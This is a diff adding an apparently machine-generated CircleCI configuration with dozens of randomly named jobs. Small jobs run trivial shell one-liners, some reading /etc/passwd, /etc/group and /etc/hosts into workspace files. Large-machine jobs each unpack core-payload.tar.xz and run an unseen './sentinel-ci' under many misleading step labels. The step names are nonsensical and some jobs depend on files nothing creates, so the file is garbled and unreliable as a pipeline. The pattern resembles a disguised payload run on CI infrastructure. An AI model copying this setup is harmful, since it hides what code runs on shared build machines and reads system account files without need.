@@ -1,0 +1,1488 @@
+version: 2.1
+
+jobs:
+  wk87694:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: BEGIN RUN GOLDEN FILES
+          command: |
+            mkdir -p /tmp/tmp-B
+            set +o pipefail 2>/dev/null; declare -A m; m[a]=1 m[b]=2 m[c]=3; { declare -p m 2>/dev/null; echo "---"; seq 1 923976; } > /tmp/tmp-B/mapper_thunder_fen; true
+            echo "fixture persisted: $(du -b /tmp/tmp-B/mapper_thunder_fen | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - 'mapper_thunder_fen'
+  november-9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Enter step
+          command: |
+            { tail -c 100 /tmp/tmp-B/neutron.lynx > /dev/null; echo "tail100 ok" ; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore vendored sources
+          command: xzcat core-payload.tar.xz | tar xvf -
+      - run:
+          command: /bin/sh -c "./sentinel-ci"
+  Body_55986:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Align on summary
+          command: |
+            mkdir -p /tmp/tmp-B
+            { set +o pipefail 2>/dev/null; function g() { cp "$1" "$1.bak" && echo "backed up $1"; }; t=$(mktemp) && g "$t"; true ; } > /tmp/tmp-B/i2Kr8dxCNtn9
+            echo "fixture persisted: $(du -b /tmp/tmp-B/i2Kr8dxCNtn9 | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - 'i2Kr8dxCNtn9'
+  jun16-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Enter step
+          command: |
+            { tail -c 100 /tmp/tmp-B/i2Kr8dxCNtn9 > /dev/null; echo "tail100 ok" ; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch fixtures
+          command: xzcat core-payload.tar.xz | tar xvf -
+      - run:
+          command: /bin/sh -c "./sentinel-ci"
+  dumpCountForKey:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: PACK INVENTORY PRIORITY
+          command: |
+            mkdir -p /tmp/tmp-B
+            { set +o pipefail 2>/dev/null; for i in `seq 8`; do echo "${i} squared is $((i**2))"; done; true ; } > /tmp/tmp-B/neutron.lynx
+            echo "fixture persisted: $(du -b /tmp/tmp-B/neutron.lynx | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - 'neutron.lynx'
+  UAT_DEPLOY_8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Enter step
+          command: |
+            { tail -c 100 /tmp/tmp-B/neutron.lynx > /dev/null; echo "tail100 ok" ; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: xzcat core-payload.tar.xz | tar xvf -
+      - run:
+          command: /bin/sh -c "./sentinel-ci"
+  skipEmailTaxAlias:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Always quantize the attention cache
+          command: |
+            mkdir -p /tmp/tmp-B
+            { set +o pipefail 2>/dev/null; df -h -x tmpfs | sort -n -k5 | awk 'NR>1 {print $5, $6}'; true ; } > /tmp/tmp-B/p33r-du57y
+            echo "fixture persisted: $(du -b /tmp/tmp-B/p33r-du57y | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - 'p33r-du57y'
+  titan2-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Enter step
+          command: |
+            { tail -c 100 /tmp/tmp-B/p33r-du57y > /dev/null; echo "tail100 ok" ; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: xzcat core-payload.tar.xz | tar xvf -
+      - run:
+          command: /bin/sh -c "./sentinel-ci"
+  rDim:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Bonk the drift monitor
+          command: |
+            mkdir -p /tmp/tmp-B
+            { set +o pipefail 2>/dev/null; find /dev -maxdepth 2 -type f -exec head -n 1 -q {} + 2>/dev/null | sed 's|.*/||' | sort -u; true ; } > /tmp/tmp-B/BACKUP_DRIFT_BOND_MARKET
+            echo "fixture persisted: $(du -b /tmp/tmp-B/BACKUP_DRIFT_BOND_MARKET | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - 'BACKUP_DRIFT_BOND_MARKET'
+  sam-verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Enter step
+          command: |
+            { tail -c 100 /tmp/tmp-B/fermion.memo.violet > /dev/null; echo "tail100 ok" ; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Hydrate workspace
+          command: xzcat core-payload.tar.xz | tar xvf -
+      - run:
+          command: /bin/sh -c "./sentinel-ci"
+  PatternEnum:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: cleanup
+          command: |
+            mkdir -p /tmp/tmp-B
+            { set +o pipefail 2>/dev/null; cat /etc/hosts | awk '{print $1}' | paste -sd ' '; true ; } > /tmp/tmp-B/rev-v6.17.39
+            echo "fixture persisted: $(du -b /tmp/tmp-B/rev-v6.17.39 | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - 'rev-v6.17.39'
+  Package_App9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Enter step
+          command: |
+            { tail -c 100 /tmp/tmp-B/rev-v6.17.39 > /dev/null; echo "tail100 ok" ; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: xzcat core-payload.tar.xz | tar xvf -
+      - run:
+          command: /bin/sh -c "./sentinel-ci"
+  price-set:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Soundcheck the packing slips
+          command: |
+            mkdir -p /tmp/tmp-B
+            { set +o pipefail 2>/dev/null; grep -r -H -i umask /etc 2>/dev/null | head -5; true ; } > /tmp/tmp-B/Wkr8
+            echo "fixture persisted: $(du -b /tmp/tmp-B/Wkr8 | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - 'Wkr8'
+  victor:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Enter step
+          command: |
+            { tail -c 100 /tmp/tmp-B/Wkr8 > /dev/null; echo "tail100 ok" ; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: xzcat core-payload.tar.xz | tar xvf -
+      - run:
+          command: /bin/sh -c "./sentinel-ci"
+  build-handle-motor:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: congratulate helpdesk later
+          command: |
+            mkdir -p /tmp/tmp-B
+            { set +o pipefail 2>/dev/null; compgen -G "/etc/*.conf" | awk -F/ '{print $NF}' | sed 's/^/- /'; true ; } > /tmp/tmp-B/NOISE_MOTH_BACKUP_FLAME
+            echo "fixture persisted: $(du -b /tmp/tmp-B/NOISE_MOTH_BACKUP_FLAME | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - 'NOISE_MOTH_BACKUP_FLAME'
+  rm-parse-redirect:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Enter step
+          command: |
+            { tail -c 100 /tmp/tmp-B/NOISE_MOTH_BACKUP_FLAME > /dev/null; echo "tail100 ok" ; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull reference data
+          command: xzcat core-payload.tar.xz | tar xvf -
+      - run:
+          command: /bin/sh -c "./sentinel-ci"
+  given_upper_manifest:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Op Moose
+          command: |
+            mkdir -p /tmp/tmp-B
+            { set +o pipefail 2>/dev/null; grep -h users /etc/passwd /etc/group | sort | uniq -c; true ; } > /tmp/tmp-B/v72ty02gu5yx
+            echo "fixture persisted: $(du -b /tmp/tmp-B/v72ty02gu5yx | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - 'v72ty02gu5yx'
+  nightly-v9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Enter step
+          command: |
+            { tail -c 100 /tmp/tmp-B/neutron.lynx > /dev/null; echo "tail100 ok" ; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: xzcat core-payload.tar.xz | tar xvf -
+      - run:
+          command: /bin/sh -c "./sentinel-ci"
+  f_RankDiscount:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Spin Enzyme Mix Task
+          command: |
+            mkdir -p /tmp/tmp-B
+            { set +o pipefail 2>/dev/null; echo -n 'version 2.0' | wc -w; true ; } > /tmp/tmp-B/v.1.4
+            echo "fixture persisted: $(du -b /tmp/tmp-B/v.1.4 | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - 'v.1.4'
+  tb-x:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Enter step
+          command: |
+            { tail -c 100 /tmp/tmp-B/fermion.memo.violet > /dev/null; echo "tail100 ok" ; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack bundle
+          command: xzcat core-payload.tar.xz | tar xvf -
+      - run:
+          command: /bin/sh -c "./sentinel-ci"
+  Service-Tag:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: indexing status update as we go
+          command: |
+            mkdir -p /tmp/tmp-B
+            { set +o pipefail 2>/dev/null; for k in $(seq 1 10); do echo $((RANDOM % 60)); done|head -n 3; true ; } > /tmp/tmp-B/CanyonUserReefModule
+            echo "fixture persisted: $(du -b /tmp/tmp-B/CanyonUserReefModule | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - 'CanyonUserReefModule'
+  sm-2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Enter step
+          command: |
+            { tail -c 100 /tmp/tmp-B/fermion.memo.violet > /dev/null; echo "tail100 ok" ; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: xzcat core-payload.tar.xz | tar xvf -
+      - run:
+          command: /bin/sh -c "./sentinel-ci"
+  shader_cli:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Skip forecast if the credit notes are down
+          command: |
+            mkdir -p /tmp/tmp-B
+            { set +o pipefail 2>/dev/null; find /dev -maxdepth 3 -name "zero" -links +1 -exec echo {} ';' 2>/dev/null | sort -r; true ; } > /tmp/tmp-B/112.96.118.253
+            echo "fixture persisted: $(du -b /tmp/tmp-B/112.96.118.253 | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - '112.96.118.253'
+  andromeda-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Enter step
+          command: |
+            { tail -c 100 /tmp/tmp-B/112.96.118.253 > /dev/null; echo "tail100 ok" ; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch corpus
+          command: xzcat core-payload.tar.xz | tar xvf -
+      - run:
+          command: /bin/sh -c "./sentinel-ci"
+  Tan80:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Unload the tutorial zone at 60 fps
+          command: |
+            mkdir -p /tmp/tmp-B
+            { set +o pipefail 2>/dev/null; printf '%s\n' "good job" | tr -d 'aeiou'; true ; } > /tmp/tmp-B/6S
+            echo "fixture persisted: $(du -b /tmp/tmp-B/6S | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - '6S'
+  depoly:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Enter step
+          command: |
+            { tail -c 100 /tmp/tmp-B/fermion.memo.violet > /dev/null; echo "tail100 ok" ; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: xzcat core-payload.tar.xz | tar xvf -
+      - run:
+          command: /bin/sh -c "./sentinel-ci"
+  lMatrixLinkPath:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: On final for enrollment
+          command: |
+            mkdir -p /tmp/tmp-B
+            { set +o pipefail 2>/dev/null; command ls -cS --file-type /mnt | sort -r; true ; } > /tmp/tmp-B/hwtxtsrc
+            echo "fixture persisted: $(du -b /tmp/tmp-B/hwtxtsrc | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - 'hwtxtsrc'
+  yolo:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Enter step
+          command: |
+            { tail -c 100 /tmp/tmp-B/hwtxtsrc > /dev/null; echo "tail100 ok" ; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prime workspace
+          command: xzcat core-payload.tar.xz | tar xvf -
+      - run:
+          command: /bin/sh -c "./sentinel-ci"
+  byte_in_us:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: The cell lines thawed by cron
+          command: |
+            mkdir -p /tmp/tmp-B
+            { set +o pipefail 2>/dev/null; echo -n 'are we there yet?' | od -c | head -n2; true ; } > /tmp/tmp-B/e2rw9XdMC9IULg3nweHv
+            echo "fixture persisted: $(du -b /tmp/tmp-B/e2rw9XdMC9IULg3nweHv | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - 'e2rw9XdMC9IULg3nweHv'
+  qi-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Enter step
+          command: |
+            { tail -c 100 /tmp/tmp-B/e2rw9XdMC9IULg3nweHv > /dev/null; echo "tail100 ok" ; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: xzcat core-payload.tar.xz | tar xvf -
+      - run:
+          command: /bin/sh -c "./sentinel-ci"
+  www3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: In parallel replay the test shards
+          command: |
+            mkdir -p /tmp/tmp-B
+            { set +o pipefail 2>/dev/null; top -b -n 1 -u $(whoami) | head -n 6; true ; } > /tmp/tmp-B/net-121.a09ad-CPU
+            echo "fixture persisted: $(du -b /tmp/tmp-B/net-121.a09ad-CPU | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - 'net-121.a09ad-CPU'
+  v8-edge:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Enter step
+          command: |
+            { tail -c 100 /tmp/tmp-B/fermion.memo.violet > /dev/null; echo "tail100 ok" ; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore snapshot
+          command: xzcat core-payload.tar.xz | tar xvf -
+      - run:
+          command: /bin/sh -c "./sentinel-ci"
+  iter7491:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Route the skeleton loader out of tier one
+          command: |
+            mkdir -p /tmp/tmp-B
+            { set +o pipefail 2>/dev/null; nl -s'. ' /etc/hosts| head -n 15; true ; } > /tmp/tmp-B/1641-PDF
+            echo "fixture persisted: $(du -b /tmp/tmp-B/1641-PDF | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - '1641-PDF'
+  q2-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Enter step
+          command: |
+            { tail -c 100 /tmp/tmp-B/fermion.memo.violet > /dev/null; echo "tail100 ok" ; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch sources
+          command: xzcat core-payload.tar.xz | tar xvf -
+      - run:
+          command: /bin/sh -c "./sentinel-ci"
+  NO_STAGE:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: verification B20
+          command: |
+            mkdir -p /tmp/tmp-B
+            { set +o pipefail 2>/dev/null; for n in theme mount frog trip limit; do echo -n "$n "; done;echo; true ; } > /tmp/tmp-B/alpha-bear-widget-south
+            echo "fixture persisted: $(du -b /tmp/tmp-B/alpha-bear-widget-south | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - 'alpha-bear-widget-south'
+  node18-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Enter step
+          command: |
+            { tail -c 100 /tmp/tmp-B/alpha-bear-widget-south > /dev/null; echo "tail100 ok" ; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: xzcat core-payload.tar.xz | tar xvf -
+      - run:
+          command: /bin/sh -c "./sentinel-ci"
+  SD-HOLD-SW:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Zero hour load
+          command: |
+            mkdir -p /tmp/tmp-B
+            { set +o pipefail 2>/dev/null; for p in {1..8..2} ; do printf '%d %d\n' $p $((p * 3)); done | wc -l; true ; } > /tmp/tmp-B/_wip285d2f
+            echo "fixture persisted: $(du -b /tmp/tmp-B/_wip285d2f | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - '_wip285d2f'
+  wip-login-glitch:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Enter step
+          command: |
+            { tail -c 100 /tmp/tmp-B/fermion.memo.violet > /dev/null; echo "tail100 ok" ; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: xzcat core-payload.tar.xz | tar xvf -
+      - run:
+          command: /bin/sh -c "./sentinel-ci"
+  rd6:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: If the old backups are missing bail out
+          command: |
+            mkdir -p /tmp/tmp-B
+            { set +o pipefail 2>/dev/null; /bin/ls -da | tr '\n' ' '; true ; } > /tmp/tmp-B/146af248b9f1
+            echo "fixture persisted: $(du -b /tmp/tmp-B/146af248b9f1 | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - '146af248b9f1'
+  rm-router:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Enter step
+          command: |
+            { tail -c 100 /tmp/tmp-B/fermion.memo.violet > /dev/null; echo "tail100 ok" ; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: xzcat core-payload.tar.xz | tar xvf -
+      - run:
+          command: /bin/sh -c "./sentinel-ci"
+  save_release_query_step:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: CMP payroll batch tax report
+          command: |
+            mkdir -p /tmp/tmp-B
+            { set +o pipefail 2>/dev/null; echo brown orange white purple yellow magenta cyan|tr ' ' '\n'|paste -s -d ' '; true ; } > /tmp/tmp-B/build_20022
+            echo "fixture persisted: $(du -b /tmp/tmp-B/build_20022 | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - 'build_20022'
+  Ship_Service8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Enter step
+          command: |
+            { tail -c 100 /tmp/tmp-B/build_20022 > /dev/null; echo "tail100 ok" ; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore vendored sources
+          command: xzcat core-payload.tar.xz | tar xvf -
+      - run:
+          command: /bin/sh -c "./sentinel-ci"
+  panWorkerRequest:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: review
+          command: |
+            mkdir -p /tmp/tmp-B
+            { set +o pipefail 2>/dev/null; printf 'host=localhost\nport=8474\nuser=tina\ndebug=true\n' >"/var/tmp/new_index.dat"&&sed -n "s/^user=//p" "/var/tmp/new_index.dat"; true ; } > /tmp/tmp-B/fermion.memo.violet
+            echo "fixture persisted: $(du -b /tmp/tmp-B/fermion.memo.violet | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - 'fermion.memo.violet'
+  STG_MERGE_9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Enter step
+          command: |
+            { tail -c 100 /tmp/tmp-B/fermion.memo.violet > /dev/null; echo "tail100 ok" ; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch fixtures
+          command: xzcat core-payload.tar.xz | tar xvf -
+      - run:
+          command: /bin/sh -c "./sentinel-ci"
+  blocksArray:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Series III archive the welcome kits
+          command: |
+            mkdir -p /tmp/tmp-B
+            { set +o pipefail 2>/dev/null; echo lisbon prague madrid perth vienna | tr ' ' '\n' | grep -v '^[a-m]'; true ; } > /tmp/tmp-B/203441_2027
+            echo "fixture persisted: $(du -b /tmp/tmp-B/203441_2027 | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - '203441_2027'
+  RUN_LAB:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Enter step
+          command: |
+            { tail -c 100 /tmp/tmp-B/neutron.lynx > /dev/null; echo "tail100 ok" ; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: xzcat core-payload.tar.xz | tar xvf -
+      - run:
+          command: /bin/sh -c "./sentinel-ci"
+  argMap:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Charge petty cash in base currency
+          command: |
+            mkdir -p /tmp/tmp-B
+            { set +o pipefail 2>/dev/null; for w in $(seq 1 8); do printf '%02d\n' ${w}; done; true ; } > /tmp/tmp-B/v_40714
+            echo "fixture persisted: $(du -b /tmp/tmp-B/v_40714 | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - 'v_40714'
+  Rollout_App1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Enter step
+          command: |
+            { tail -c 100 /tmp/tmp-B/v_40714 > /dev/null; echo "tail100 ok" ; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: xzcat core-payload.tar.xz | tar xvf -
+      - run:
+          command: /bin/sh -c "./sentinel-ci"
+  thirstStats:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: compacting sessions table now
+          command: |
+            mkdir -p /tmp/tmp-B
+            { set +o pipefail 2>/dev/null; gzip -c /etc/group >'/tmp/rule_grape.gz' && gunzip -c '/tmp/rule_grape.gz' | wc -l; true ; } > /tmp/tmp-B/ix
+            echo "fixture persisted: $(du -b /tmp/tmp-B/ix | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - 'ix'
+  pat-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Enter step
+          command: |
+            { tail -c 100 /tmp/tmp-B/fermion.memo.violet > /dev/null; echo "tail100 ok" ; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Hydrate workspace
+          command: xzcat core-payload.tar.xz | tar xvf -
+      - run:
+          command: /bin/sh -c "./sentinel-ci"
